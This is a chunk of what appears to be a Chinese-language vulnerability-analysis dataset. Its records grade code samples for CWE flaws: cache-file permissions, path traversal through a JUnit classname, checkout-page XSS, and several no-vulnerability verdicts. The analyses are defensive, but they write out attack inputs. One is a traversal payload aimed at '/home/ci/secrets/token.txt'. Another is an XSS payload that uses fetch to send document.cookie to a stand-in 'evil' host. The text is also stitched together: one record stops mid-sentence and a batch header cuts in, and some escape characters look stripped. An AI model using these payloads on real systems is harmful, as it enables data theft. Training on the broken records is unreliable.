+次级面核验：line 162-168 Get 中 FileGetContents(fn) → GobDecode(fileData, &to) —— 缓存文件被 gob 反序列化；line 202 Put 中 gob.Register(val) 按应用写入的类型动态注册，若本地攻击者获得缓存目录写权限（0777 请求值在宽松 umask 下可写；默认 umask 下仅属主可写，此为部署依赖），可投放恶意 gob 数据由 Get 反序列化为已注册的具体类型。该升级路径以本地写权限为前提，不改变主判定，但 0777 的请求值恰好放大了此风险。gob 属纯数据编码格式、无任意类型实例化 gadget 的独立演示，不定 CWE-502（互斥锚：非 CWE-502 因为解码目标固定为 *FileCacheItem 且类型受 gob 注册表约束，样本内无 RCE gadget 链）。
+line 146: fmt.Printf("cachePath: %sn", cachePath) 调试输出泄露缓存路径至 stdout，记卫生问题。
+最小利用路径：同机低权用户 ls -l /app/cache 直接读取 0755 缓存文件 → gob 解码其中的会话/令牌数据。
+has_vulnerability: true
+vulnerability_type: CWE-732 Incorrect Permission Assignment for Critical Resource
+risk_level: Medium
+source: line 210-217: Put(ctx, key, val, timeout) 写入的任意应用数据（val interface{}，可含会话/令牌）落盘为缓存文件
+sink: line 313: os.WriteFile(filename, content, os.ModePerm)（配合 line 122/145 的 os.MkdirAll(..., os.ModePerm)）以 0777 请求权限创建世界可读的缓存文件/目录
+explanation: 应用数据经 Put 写入缓存文件 → WriteFile/MkdirAll 以 os.ModePerm(0777) 创建，仅靠 umask 削减 → 同机任意本地用户可读取可能含会话/令牌的缓存内容；非 CWE-22/73 因为外部可控 key 经 SHA-256 hex 化后无法注入路径字符，非 CWE-502 因为 gob 解码目标固定且无样本内 gadget 链。
+fix_suggestion: line 122、145 改为 os.MkdirAll(path, 0o700)；line 313 改为 os.WriteFile(filename, content, 0o600)；同时删除 line 146 的 fmt.Printf 调试输出。
+
+redistill-line-7846
+分析过程: 全入口枚举：入口=结果目录中的 *.xml 测试结果文件（line 129: listResults(directory).forEach(result -> parseRootElement(...))）——CI 场景下该文件可由不可信来源产生（外部贡献者的测试输出），按不可信输入处理。
+主链（路径穿越）逐跳：line 184: final String className = testCaseElement.getAttribute(CLASS_NAME_ATTRIBUTE_NAME); —— classname 属性完全由 XML 内容控制。line 199-203: getLogFile(resultsDirectory, className).filter(Files::exists).map(visitor::visitAttachmentFile) —— 文件存在即作为附件并入报告。line 227-229: Optional.ofNullable(className).map(name -> name + ".txt").map(resultsDirectory::resolve); —— 防御核验：唯一防御是 line 230-233 catch (InvalidPathException e)，它只拦截操作系统非法字符（如 NUL），对 ../ 序列无任何作用；resolve 前无 normalize、无"结果路径必须仍位于 resultsDirectory 内"的前缀校验，且 Path.resolve 对绝对路径参数直接整体替换基路径——className=/etc/foo 时连 ../ 都不需要。防御不完整，可绕过。
+最小利用路径：投递 <testcase classname="../../../../../../home/ci/secrets/token.txt" .../> 的 junit XML → 命中存在性过滤后，CI 机器上任意 *.txt 文件被读入并在 Allure 报告页面呈现；绝对路径形态 classname="/home/ci/notes" 同样逃逸。影响=越权读取（受 ".txt" 后缀追加约束）。
+XML 解析面核验：line 136-137: DocumentBuilderFactory.newInstance() → factory.setValidating(false) —— setValidating(false) 只关闭 DTD 校验，不禁用实体解析，非 XXE 防御；line 139: builder.setEntityResolver(new ClasspathEntityResolver()) —— 外部实体/DTD 的解析被交给该 resolver，其"未命中时返回空 InputSource（阻断）还是返回 null（回退默认外联）"决定 XXE 是否成立，实现不在样本内。待查证：ClasspathEntityResolver 对任意未知 systemId 的返回值语义；factory 亦未设置 disallow-doctype-decl/external-general-entities 特性。因该防御点行为无法在样本内核验，XXE 不作为本记录结论，仅路径穿越链证据完备。
+次级记录：line 227-233 之外，className/name/hostname 等未净化值进入报告标签（line 279-285 区段的 addLabelIfNotExists），最终渲染行为属报告 UI（样本外），不定 XSS。
+互斥锚句：非 CWE-73 因为发生的是目录边界逃逸（../ 与绝对路径替换），不是仅文件名可控；非 CWE-611 结论因为实体解析器行为样本内不可核验（已记待查证）。
+has_vulnerability: true
+vulnerability_type: CWE-22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
+risk_level: High
+source: line 184: testCaseElement.getAttribute("classname")——不可信 junit XML 中的 classname 属性
+sink: line 199-203: getLogFile 产出的 Path 经 Files::exists 过滤后交给 visitor::visitAttachmentFile 读取并作为附件发布（路径构造在 line 229: resultsDirectory::resolve）
+explanation: XML classname 属性 → 拼接 ".txt" → resultsDirectory.resolve（../ 或绝对路径直接逃逸结果目录，InvalidPathException 防御只拦非法字符不拦穿越）→ 存在即被读入报告附件，构成任意（.txt 后缀受限）文件读取；非 CWE-73 因为穿越了目录边界而非仅控制文件名。
+fix_suggestion: line 227-229 改为：先 Path candidate = resultsDirectory.resolve(className + ".txt").normalize()，再校验 candidate.startsWith(resultsDirectory.normalize())，不满足即返回 Optional.empty()；并拒绝含 /、、.. 的 className。加固：line 136-139 显式设置 factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true) 或禁用外部实体特性，不依赖 resolver 的未核验行为。
+
+redistill-line-7859
+分析过程: 全入口枚举：HTTP 响应 JSON（fetch 回调）、DOM data-* 属性（line 20: data-fetchTranslations、line 64: data-feeurl、line 143: data-qrcode 等，服务端模板渲染，按同站可信边界处理）、window.location（line 226-241）、第三方 Mollie SDK 回调（line 396-467 区段的 change 事件 event.error）。
+主链逐跳：line 64: const feeUrl = currentItem.getAttribute('data-feeurl'); → line 66: getPaymentFee(feeUrl); → line 70-71: fetch(url).then((response) => response.json()) → line 83-85: if (data.view && orderTotalTr) { orderTotalTr.insertAdjacentHTML('beforebegin', data.view); } —— 防御核验：response.json() 仅约束响应体是合法 JSON，对其中 view 字段的内容零约束；insertAdjacentHTML 将字符串按 HTML 解析并插入 DOM，无 DOMPurify/无 textContent 降级，无任何净化点。data.view 为 <tr id="mollie-paymentFee-row">...<img src=x onerror=...></tr> 形态即在结账页脚本上下文执行。
+可达性论证（为何判 true）：feeUrl 端点的响应是本域应用生成的 HTML 片段，典型实现会把支付方式名称等数据库/管理端可编辑文本渲染进片段——存储型注入者（商店管理员或被入侵的内容源）经该字段直达买家浏览器的 HTML sink；同页还存在 document.querySelector('.online-payment__input:checked') 等买家侧交互，触发路径=买家在结账页切换支付方式（line 44-67 的 change 监听）即拉取并插入。样本外假设（显式标注，不作为唯一依据）：fee 端点将任何用户/管理员可控文本回显进 data.view。
+对照安全写法（同文件内防御反证）：line 262-264: title.textContent = 'Scan QR';、line 270: paragraph.textContent = 'Open your ' + qrCodeMethod + ...、line 309-312: 弹窗按钮均用 textContent；line 280: popupContent.insertAdjacentHTML('beforeend', '<p>Or</p>'); 仅插入静态字面量——文件其余 HTML 注入点全部为常量或 textContent，唯独 line 85 将网络来源字符串交给 HTML sink，是孤立的不安全点而非全局风格。
+其余面核验：line 180: qrCodeImg.src = qrCode; —— img.src 属性赋值，javascript: 在 img 上下文不执行，最坏为外部资源加载，非代码执行 sink；line 214: window.location.href = thankYouPageUrl + '?orderToken=' + orderToken; —— 目标前缀来自可信 DOM 属性，orderToken（line 186-188 来自响应，或 line 236-240 取自 URL 尾段）只落在查询串位，无法改写目的地 host，非 CWE-601；line 167-171: createMolliePayment 的 url + '?paymentMethod=' + paymentMethod 中 paymentMethod 受 line 142 target.value === 'bancontact' || target.value === 'ideal' 白名单约束，fetch 目标不可任意化，非 SSRF/开放重定向；line 396-467 的信用卡错误信息经 textContent 渲染（如 line 413: cardHolderError.textContent = ...），安全。
+最小利用路径：令 fee 端点响应 {"view":"<tr><td><img src=x onerror="fetch('//evil/'+document.cookie)"></td></tr>"} → 买家在结账页点选该支付方式 → change 事件触发 getPaymentFee → insertAdjacentHTML 执行脚本，可窃取会话上下文或篡改订单总额显示（line 87-89: orderTotalRow.textContent = data.orderTotal 本身即为服务端可操纵的金额展示，配合脚本可完整伪造价格显示）。
+互斥锚句：非 CWE-918/601 因为 fetch 目的地由服务端渲染的 data-* 属性固定，攻击者控制的是响应内容而非请求目的地；判定按最终渲染上下文（HTML 解析插入），不因响应是 JSON 而豁免——非"数据格式即安全"。
+has_vulnerability: true
+vulnerability_type: CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
+risk_level: High
+source: line 71: fetch(url).then((response) => response.json()) 中 fee 端点响应的 data.view 字段（网络来源字符串；上游可控性为存储型注入场景，见样本外假设标注）
+sink: line 85: orderTotalTr.insertAdjacentHTML('beforebegin', data.view) —— 未经净化的字符串按 HTML 解析插入结账页 DOM
+explanation: data-feeurl 端点响应的 view 字段 → response.json() 仅做格式解析不做内容净化 → insertAdjacentHTML 将其作为 HTML 注入买家结账页执行上下文；同文件其余注入点均为静态字面量或 textContent（line 262-280），唯此一处网络字符串进 HTML sink，非 CWE-601/918 因为 fetch 目的地由可信 DOM 属性固定、不可被响应内容改写。
+fix_suggestion: line 83-85 改为不使用 insertAdjacentHTML 插入网络内容：用 DOMParser 解析后白名单过滤，或引入 DOMPurify.sanitize(data.view) 后再插入；更彻底的做法是服务端只返回结构化字段（费用文案、金额），前端用 textContent/createElement 组装行。
+
+redistill-line-7996
+分析过程: 全入口枚举：入口①=CertSelector/CRLSelector 中的 subject/issuer DN（可由待验证的不可信证书链派生）；入口②=X509LDAPCertStoreParameters（应用配置，可信）；入口③=LDAP 服务器响应字节（网络数据源）。
+LDAP 注入面防御核验：不可信 DN 值流向过滤器前经 line 165: return filterEncode(temp);（parseDN 尾部）。filterEncode 实现 line 436-462：逐字符查 FILTER_ESCAPE_TABLE；表初始化 line 53-69 对→2a、(→28、)→29、→5c、NUL→00 完成 RFC2254 全部特殊字符转义，其余字符原样——转义表覆盖完备（RFC2254 过滤器特殊字符集恰为这五个），双向论证：有效。拼接点 line 293: set.addAll(search(attrName, "" + attrValue + ", attrs)); 中通配符是代码有意添加的模糊匹配语义，值部分已不可携带元字符；line 480: String filter = attributeName + "=" + attributeValue; 的 attributeName 来自 params（可信配置）。line 499: String filter2 = "(&(" + filter + ")(" + temp[0] + "=))"; 中 temp[0]=attrs[i] 同样来自 params 属性名配置。结论：不可信值无法改写过滤器布尔结构，非 CWE-90（互斥锚）。
+结果消费面：line 197-230 engineGetCertificates 对每个 LDAP 返回字节流先尝试 CertificatePair 解析（line 205-208），失败降级单证书，随后 line 236 附近 cf.generateCertificate(bIn) + if (xselector.match(cert)) —— 返回内容必须是能通过 X.509 语法校验且
+
+已接收并解析附件任务包：【蒸馏批次 redistill | 样本数=8】，实际收到 8 个样本块（redistill-line-8084/8085/8088/8090/8091/8093/8096/8097），三要素齐全，数量与声明一致，按正文等价处理。以下为 8 条记录。
+
+redistill-line-8084
+分析过程: 全入口枚举：本文件为 nuclio pkg/common 工具库，无 HTTP handler；非 HTTP source 包括环境变量（第361行 value := os.Getenv(key)，经 GetEnvOrDefault* 系列返回给调用方，本文件内未流入任何危险 sink）、文件读取（第279行 containerID, err := os.ReadFile("/etc/hostname")，仅 TrimSpace 后作为主机名返回）、其余均为调用方传参。逐段核验库内自带防御点：
+line 467-468: if specialCharPattern.MatchString(s) { return "'" + strings.ReplaceAll(s, "'", "'"'"'") + "'" —— Quote() 的 shell 转义与 POSIX 单引号惯用法一致（第53行 specialCharPattern = regexp.MustCompile([^w@%+=:,./-]) 定义的"安全字符集"不含任何 shell 元字符，未匹配时原样返回亦安全），有效。
+line 79-82: cleanPath := filepath.Clean(path) → absPath, err := filepath.Abs(cleanPath) —— SanitizePath 做归一化消除 ../，但不做基目录包含性校验；若调用方误以为它提供目录禁闭则是误用，本文件内无"外部路径→文件操作"的完整链，无法构成 CWE-22 判定。
+line 660-663: contentType := headers.Get("Content-Type") + 空/非 html/javascript 直接放行；line 673-674: policy := bluemonday.UGCPolicy() → sanitizedData := policy.Sanitize(string(data)) —— SanitizeResponseData 对声明为 html/javascript 的响应体用 bluemonday UGC 白名单净化，方向正确；text/plain 载 HTML 会绕过净化，但现代浏览器不会将 text/plain 嗅探执行，绕过需"下游未设 X-Content-Type-Options 且浏览器嗅探"——样本外假设，不作为结论依据。
+line 51: var seededRand = rand.New(rand.NewSource(time.Now().UnixNano()))；line 509: randomString[i] = letters[seededRand.Intn(len(letters))] —— math/rand 非密码学 PRNG，可预测；但"该随机串被用于安全令牌"需样本外假设，本文件内 GenerateRandomString 无安全上下文消费点，按"定义但安全用途未证实"不构成 CWE-338 判定，仅作加固项。
+line 394-395: template.New("t").Parse(text) 用 text/template（无自动转义）；line 420: templateToRender.Execute(&templateToRenderBuffer, &data) —— 若 text 为不可信输入则构成模板注入（CWE-1336 近邻），但 text 由调用方传入，本文件内无外部 source 到达该参数；Go text/template 默认无函数表，可达性受限。待查证：调用方是否将用户输入作为模板正文。
+line 484: regexp.MustCompile(pattern).MatchString(s) —— pattern 来自调用方参数，非本文件外部输入；MustCompile 对非法正则会 panic，属健壮性问题。
+利用可行性：本文件内不存在从外部可控 source 到危险 sink 的完整路径，无可构造的最小利用链。互斥锚句：非 CWE-78，因 Quote() 转义完整且文件内无命令执行 sink；非 CWE-22/73，因 SanitizePath 仅归一化、无文件操作闭环；非 CWE-1336，因模板正文来源在文件外；非 CWE-338 定罪，因无安全用途证据。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 纯工具库文件，各防御点（Quote 转义、bluemonday 净化、Clean+Abs 归一化）核验有效或无完整攻击链闭环；非 CWE-338 因为弱 PRNG 的安全用途未在本文件内证实，非 CWE-1336 因为模板正文非本文件外部输入。
+fix_suggestion: no fix needed；加固建议：第51行改用 crypto/rand 供 GenerateRandomString 使用，第76行 SanitizePath 增加调用方传入的基目录前缀校验，第394行 RenderTemplate 若面向用户内容改用 html/template。
+
+redistill-line-8085
+分析过程: 全入口枚举：本文件为 Cloudreve types 包，全部内容（第8-223行类型定义、第225-396行常量、第265-273行唯一函数）均为声明式代码，无 HTTP 入口、无文件/环境/DB source、无执行 sink。逐段核验：
+line 265-273: func FileTypeFromString(s string) FileType —— 仅 switch 字符串映射到枚举，无副作用。
+line 44: Token string json:"token"（PolicySetting 的 Upyun Token）、line 131: Password string json:"password,omitempty"（QBittorrentSetting）、line 138: Token string json:"token,omitempty"（Aria2Setting）、line 167-170: Algorithm/Key/KeyPlainText/IV（EncryptMetadata）—— 结构体字段带 JSON tag 意味着序列化时会输出这些敏感值；是否泄露取决于 API 层是否将该结构体直接回传前端——样本外假设，本文件内无序列化调用点，不构成 CWE-312/200 判定，仅为设计风险点。
+line 372: CipherAES256CTR Cipher = "aes-256-ctr" —— CTR 模式无认证（非 AEAD），但算法实现在文件外；本行仅是常量声明，不构成 CWE-327 判定。
+line 183-189: ExplorerView 字段带 binding:"min=50"、binding:"eq=asc|eq=desc" 等校验 tag —— 表明绑定层存在验证机制（实现在框架侧）。
+利用可行性：无可执行逻辑，攻击面为零，不存在利用路径。互斥锚句：非 CWE-312，因文件内无存储/传输行为；非 CWE-327，因无加密实现。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 纯类型与常量声明文件，无任何 source→sink 数据流；非 CWE-312 因为敏感字段（第44/131/168-169行）仅是结构定义，序列化与暴露行为均在文件外。
+fix_suggestion: no fix needed；加固建议：为第44行 Token、第131行 Password、第169行 KeyPlainText 考虑增加 json:"-" 或专用脱敏 DTO，避免上游 API 直接序列化外泄。
+
+redistill-line-8088
+分析过程: 全入口枚举：Gitea models 层，无 HTTP 入口；外部可控输入为函数参数：search string（第157行 func GetIssuePostersWithSearch(ctx context.Context, repo *Repository, isPull bool, search string)，上游来自 issue 筛选查询参数——样本外假设其可控，按可控处理）、opts 各 ID 字段（第22-24行 StarrerID/RepoOwnerID 为 int64 强类型）。逐跳核验 sink 均为 xorm 查询：
+line 34-35: var cond builder.Cond = builder.Eq{"star.uid": opts.StarrerID,} —— builder.Eq 的键为硬编码列名、值走占位符绑定；line 38-39、43-44、78-79、82-83、87-88、91-92 同构，全部参数化。
+line 53: e.Join("INNER", "star", "repository.id=star.repo_id")；line 99 同构 —— JOIN 条件为纯静态字符串，无输入拼接。
+line 119: Where("repo_id = ? AND mode >= ?", repo.ID, perm.AccessModeWrite) —— 显式 ? 占位符参数化，有效。
+line 141-143: e.In("id", uniqueUserIDs.Values()).Where(builder.Eq{"user.is_active": true}).OrderBy(user_model.GetOrderByName()) —— In 绑定 int64 集合，OrderBy 来自固定函数，无输入。
+line 167: var prefixCond builder.Cond = builder.Like{"lower_name", strings.ToLower(search) + "%"}；line 168: prefixCond = prefixCond.Or(db.BuildCaseInsensitiveLike("full_name", "%"+search+"%")) —— 关键核验点：xorm builder.Like 将第二参数作为绑定值（生成 lower_name LIKE ?），search 的字符串拼接发生在 Go 层的 LIKE 模式串内，不进入 SQL 语法结构；BuildCaseInsensitiveLike 为 Gitea db 包封装（同样走绑定——待查证：其内部实现，但按 xorm builder 语义与函数命名惯例为参数化）。因此 search 中的 '、)、; 等无法逃逸出绑定值。
+防御双向论证：参数化查询 = 有效防御（预置裁决 F）；残余面仅为 LIKE 通配符 %/_ 未转义——攻击者提交 search="%" 可匹配全部用户，但结果仍被第160-164行 builder.In（限定为该 repo 的 issue 作者）与第176行 Limit(30) 约束，属查询语义内的匹配范围扩大，非注入。
+利用可行性：无注入路径；最小"攻击"仅能用通配符枚举≤30个已发帖用户名（本就对该 repo 可见），无越权数据。互斥锚句：非 CWE-89，因所有外部值均经占位符/绑定进入 SQL，列名与 JOIN 条件全部硬编码；非 CWE-943，因 sink 是 SQL 而非 NoSQL。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 所有用户可控值（opts ID、search）均通过 xorm builder.Eq/Like 与 ? 占位符参数化绑定（第34-35、119、167-168行），无 SQL 拼接点；非 CWE-89 因为不存在字符串拼接进 SQL 语法结构的通路，LIKE 通配符未转义仅影响匹配宽度且在 repo 作者集合与 Limit(30) 内闭合。
+fix_suggestion: no fix needed；加固建议：第167-168行可对 search 中的 % 和 _ 做 LIKE 转义，防止通配符滥用导致的宽匹配枚举。
+
+redistill-line-8090
+分析过程: 全入口枚举：Shopware Core Context 类，无 HTTP 入口；所有状态由构造函数注入（第44-57行 public function __construct(protected ContextSource source, ...)），source 由框架 API 层构造——本文件内无外部输入直达点。逐段核验关注面：
+line 190-197: public function isAllowed(string privilege): bool { if (this->source instanceof AdminApiSource) { return this->source->isAllowed(privilege); } return true; } —— 第196行对非 AdminApiSource（SystemSource/SalesChannelSource 等）一律返回 true。双向论证：这是 Shopware 权限模型的既定语义——ACL 特权仅约束 Admin API 会话；SystemSource 由第76行 source ??= new SystemSource();（createDefaultContext，标注 @internal）等内部路径构造，非请求可控。要将其变成越权，攻击者需能让外部请求携带非 AdminApiSource 的 Context——source 的构造在 API 解析层（文件外），本文件内无该通路；判定越权需样本外假设，不成立。
+line 58-60: if (source instanceof SystemSource) { this->scope = self::SYSTEM_SCOPE; } —— scope 提升仅限构造时注入的 SystemSource，同上不可外部触达。
+line 62-68: if (empty(languageIdChain)) { throw new InvalidArgumentException(...) } + array_keys(array_flip(array_filter(languageIdChain))) —— 输入校验与非空链去重，防呆有效。
+line 151-163: scope() 在 try/finally 中恢复原 scope，异常路径不会遗留提权状态，有效。
+line 202-208: setRuleIds 受第204行 if (this->rulesLocked) { throw new ContextRulesLockedException(); } 保护，锁定后不可改规则集，有效。
+利用可行性：无外部可控 source→sink 链；isAllowed 的 true 分支需先取得非 Admin 上下文构造能力，本文件不提供。互斥锚句：非 CWE-862/639，因本文件不含授权决策的调用面，仅是上下文载体；非 CWE-269，因 scope 变更均由内部类型判定驱动。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: Context 为框架内部状态载体，第196行 return true; 的特权放行仅作用于非 AdminApiSource（System/SalesChannel）上下文且 source 构造不受请求控制，规则锁定（第204行）与 scope 恢复（第156-160行）核验有效；非 CWE-863 因为授权绕过需要文件外的 source 构造通路，本文件内不存在。
+fix_suggestion: no fix needed；加固建议：可在第190行 isAllowed 的文档注释中显式声明"非 AdminApiSource 视为完全受信"，防止下游误把用户可控数据当作 ContextSource 注入。
+
+redistill-line-8091
+分析过程: 全入口枚举：Showdown 的 getDefaultOpts(simple)（第8行 function getDefaultOpts (simple) {），唯一外部输入是参数 simple，其消费点仅为第183行 if (simple === false) { 的严格相等分支选择——无注入面。逐段核验：
+line 11-182: let defaultOptions = {...} —— 全部为字面量常量（34 个选项的 defaultValue/describe/type），无外部数据参与构造。
+line 184: return JSON.parse(JSON.stringify(defaultOptions)); —— JSON.parse 的输入是对本文件内常量对象的序列化结果，非不可信数据；且 JSON.parse 不执行代码、无原型污染 gadget（proto 键在常量中不存在），非 CWE-502（JSON 纯数据解析按裁决 F 不构成反序列化漏洞）。
+line 187-189: for (let opt in defaultOptions) { if (Object.prototype.hasOwnProperty.call(defaultOptions, opt)) { ret[opt] = defaultOptions[opt].defaultValue; } } —— for-in 被第188行 hasOwnProperty 守卫，原型链属性不会泄入结果；写入键 opt 来自常量对象自身键，非用户可控动态键，不构成 CWE-915。
+line 177-181: disallowRawHTML: { defaultValue: false, ... } —— 默认允许原始 HTML 透传是 markdown 渲染器的既定产品语义（GFM 兼容），"渲染不可信 markdown 且未额外消毒→XSS"的责任在集成方（文件外），本文件仅是默认值声明，非 CWE-79 判定。
+利用可行性：函数无副作用、无 sink（不操作 DOM/eval/网络/文件），不存在任何 payload 形态。互斥锚句：非 CWE-79，因本文件不产生渲染输出；非 CWE-915，因无用户可控键写入；非 CWE-502，因 JSON.parse 对象是本地常量。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 纯默认选项常量工厂函数，唯一输入 simple 只参与第183行严格相等比较，第184行 JSON.parse 作用于本地常量、第188行 hasOwnProperty 阻断原型链；非 CWE-79 因为 disallowRawHTML 默认值（第178行）只是配置声明，渲染与消毒均发生在文件外。
+fix_suggestion: no fix needed；加固建议：在文档中提示集成方——当渲染不可信 markdown 时应开启第177-181行 disallowRawHTML 或叠加 DOMPurify 等输出消毒。
+
+redistill-line-8093
+分析过程: 全入口枚举：Upsonic 成本计算工具模块，无 HTTP 入口；外部输入面为各静态方法参数（token 计数、usage 对象、model 标识、cost 字符串），全部来自框架内部会话数据（模块 docstring 第4行 Cost data is derived from session usage stored in storage.）。逐段核验 sink：
+line 49: return get_estimated_cost(input_tokens, output_tokens, model) 及第66、82、105行同构委托 —— 仅算术/查表委托给 upsonic.utils.usage（第15-21行 import），本文件内无 eval/exec/命令/SQL/模板 sink。
+line 123-130: if cost_string.startswith('~'): return float(cost_string[2:]) ... except (ValueError, TypeError): return 0.0 —— float() 解析任意字符串安全（非 eval），异常被捕获回退 0.0，无崩溃或注入面。
+line 156-168: get_provider_name 用 hasattr 探测与字符串前缀判断（if '/' in model_name: return model_name.split('/', 1)[0]）—— 纯字符串处理，返回值仅作展示标识。
+line 186-195: format_cost 用 f-string 格式化浮点数（return f"{cost:.4f}"）；line 205-216: format_tokens 同构 —— f-string 作用于 float/int，无用户可控格式串（非 CWE-134：格式说明符是硬编码字面量，被格式化的值是数值类型）。
+line 97-99: input_tokens = run_usage.input_tokens or 0 —— None 防御，算术健壮性处理。
+利用可行性：所有函数的输出是成本/ token 展示字符串，不进入任何执行、查询或渲染 sink（渲染在调用方）；即使 token 计数被上游污染，影响上限是显示错误的成本数字，无安全后果链。互斥锚句：非 CWE-134，因格式串为硬编码；非 CWE-95/94，因无任何代码执行原语。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 纯算术与格式化工具模块，第123-130行 float 解析带异常回退、第186-216行 f-string 仅格式化数值，无外部输入可达的执行/查询/渲染 sink；非 CWE-134 因为格式说明符全部为硬编码字面量。
+fix_suggestion: no fix needed；加固建议：第156-168行 get_provider_name 的前缀启发式（gpt-/claude-/gemini-）可集中为映射表，降低维护期误判，无安全影响。
+
+redistill-line-8096
+分析过程: 全入口枚举：Easy!Appointments（CodeIgniter）控制器，两个 HTTP 入口：index()（第56行 public function index(): void，GET）与 save()（第92行 public function save(): void，POST）。逐跳核验 save() 的 source→sink 链：
+source: 第100行 settings = request('booking_settings', []);（POST 体，管理员可控）。
+line 94: method('post'); —— 限定请求方法。
+line 96-98: if (cannot('edit', PRIV_SYSTEM_SETTINGS)) { throw new RuntimeException(...); } —— 编辑权限门，未授权即抛异常终止，有效。
+line 100: check('booking_settings', 'array|null'); —— 类型校验。
+line 103: existing_setting = this->settings_model->query()->where('name', setting['name'])->get()->row_array(); —— CI Query Builder 的 where(字段, 值) 双参形式生成绑定/转义条件，setting['name'] 不拼接进 SQL 语法，非 CWE-89。
+line 110-115: if (!empty(setting['name']) && str_starts_with(setting['name'], 'label_custom_field_')) { setting['value'] = strip_tags(setting['value'] ?? ''); } —— 仅对 label_custom_field_* 前缀的值做 strip_tags。双向论证：该防御对目标字段有效（剥离全部标签）；但覆盖不全——其他任意 name 的 value（第117行后）原样入库。是否构成存储型 XSS 取决于这些值在视图/公共预约页是否未转义输出——渲染层在文件外，样本外假设，不能作为 CWE-79 结论依据。可确认的文件内事实：管理员可写入任意 name/value 设置对。
+line 117: this->settings_model->only(setting, this->allowed_setting_fields); 配合第23行 public array allowed_setting_fields = ['id', 'name', 'value']; —— 字段白名单，阻断向 settings 表其他列的质量赋值（mass assignment 防御有效）。
+line 121: this->settings_model->save(setting); —— sink 为白名单过滤后的 DB 写入。
+index() 核验：第62-70行 cannot('view', PRIV_SYSTEM_SETTINGS) 权限门（403/重定向登录），第74-78行 script_vars([...'booking_settings' => filter_sensitive_settings(this->settings_model->get_batch()),]) —— 输出经敏感项过滤后交模板/JS 变量层，转义由视图层负责（文件外）。
+CSRF 核验：save() 文件内无 token 校验代码；CodeIgniter 可通过全局配置 csrf_protection 统一启用（配置文件在样本外）。待查证：EA_Controller/框架配置是否启用全局 CSRF 防护。按规则样本外断言不作结论依据，文件内证据不足以判 CWE-352。
+利用可行性：非管理员在权限门（第96行）被拒；管理员写入任意设置为产品授权语义；XSS/CSRF 判定各缺一环（渲染转义/框架 CSRF 配置均在文件外），无可在本文件闭合的最小利用链。互斥锚句：非 CWE-89，因 where 为绑定式双参调用；非 CWE-915，因 only() 白名单限定了可写键集；非 CWE-79/352 定罪，因关键闭环证据在样本外并已标注待查证。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: save() 链上权限门（第96行）、类型校验（第100行 check）、字段白名单（第117行 only + 第23行 allowed_setting_fields）、绑定式查询（第103行）逐段核验有效，strip_tags（第114行）对 label_custom_field_* 定向生效；非 CWE-89 因为 where 双参形式走值绑定，非 CWE-79/352 因为渲染转义与框架级 CSRF 配置均在文件外（已标注待查证，不作定罪依据）。
+fix_suggestion: no fix needed；加固建议：第110-115行 strip_tags 目前仅覆盖 label_custom_field_* 前缀，建议对所有入库 value 统一做输出侧转义或输入侧消毒，并在控制器层显式校验 CSRF token（不依赖框架全局配置的隐式保护）。
+
+redistill-line-8097
+分析过程: 全入口枚举：Composer LockTransaction（依赖解析器内部类，@internal 标注于第21行注释），无 HTTP 入口；输入为 composer.lock/composer.json 派生的包元数据（presentMap、decisions、aliases）——本地 CLI 工具处理项目自带锁文件，威胁模型是本地开发者工具链，非远程攻击面。逐段核验唯一的数据变换点 updateMirrorAndUrls：
+line 169-172: if (package->getDistUrl() !== null && presentPackage->getDistReference() !== null && Preg::isMatch('{^https?://(?:(?:www.)?bitbucket.org|(api.)?github.com|(?:www.)?gitlab.com)/}i', package->getDistUrl())) —— dist URL 改写被硬性限定在 bitbucket/github/gitlab 三个已知主机前缀的 https? URL 白名单内，任意主机 URL 不进入改写分支，有效。
+line 173: presentPackage->setDistUrl(Preg::replace('{(?<=/|sha=)[a-f0-9]{40}(?=/|)}i', presentPackage->getDistReference(), package->getDistUrl())); —— 被替换目标仅限 URL 中 40 位十六进制 sha 段；替换值 DistReference 若含 0 等 preg 替换反向引用，因模式无捕获组、0 展开仍是原 sha 匹配文本，无法注入新主机或路径结构；且该值本就来自同一锁文件（本地信任边界内），改写结果仍受第169-172行主机白名单约束。
+line 152-160: setSourceUrl/setSourceMirrors 直接镜像包对象自身数据，无字符串拼接进命令/SQL/代码 sink。
+line 76-88: setResultPackages 遍历 decisions 做数组归类；line 185-198: getAliases 用 === 严格比较包名并 usort 排序 —— 均为纯内存数据结构操作，无危险 sink。
+利用可行性：全文件无命令执行、无文件写入、无网络请求、无 eval 类原语；即使锁文件由第三方提供（供应链场景），本类只做元数据搬运与受限 URL 改写，下载行为与哈希校验在文件外（Installer/Downloader，样本外）。互斥锚句：非 CWE-20 定罪，因第169-172行白名单已约束改写域；非 CWE-94/95，因 Preg::replace 是数据变换非代码执行，替换值不含可执行语义。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 锁文件元数据仅在内存中归类搬运，唯一的 URL 改写点（第173行）被第169-172行的 bitbucket/github/gitlab 主机白名单与 40 位 hex 定位模式双重约束，文件内无命令/代码/查询 sink；非 CWE-20 因为改写域已被白名单闭合。
+fix_suggestion: no fix needed；加固建议：第173行可用 str_replace 定位替换或将 DistReference 校验为 ^[a-f0-9]{40} 后再替换，彻底消除 preg 替换串中  序列的理论歧义。
+
+##### redistill-line-8098
+分析过程: 全入口枚举：本文件为 Go 测试文件（第 1 行 package files，第 7 行导入 "testing"），无任何 HTTP/CLI/配置文件等攻击者可达入口，所有数据均由测试自身通过 t.TempDir() 构造（第 14 行 scope := t.TempDir()）。
+line 18: fs := NewScopedFs(afero.NewOsFs(), scope) 构造被测对象，输入全部为测试常量（如第 20 行 fs.Stat("/file.txt")）。
